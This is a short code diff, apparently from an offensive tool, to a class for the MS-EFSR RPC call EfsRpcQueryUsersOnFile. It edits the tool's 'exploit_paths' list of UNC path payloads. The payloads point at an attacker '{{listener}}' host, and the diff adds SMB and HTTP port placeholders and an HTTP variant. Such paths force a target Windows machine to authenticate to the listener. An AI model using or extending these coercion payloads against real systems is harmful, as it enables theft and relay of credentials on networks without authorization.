@@ -28,9 +28,10 @@ class EfsRpcQueryUsersOnFile(MSPROTOCOLRPCCALL):
     """
 
     exploit_paths = [
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\File.txt\x00'),
     ]
 
     access = {
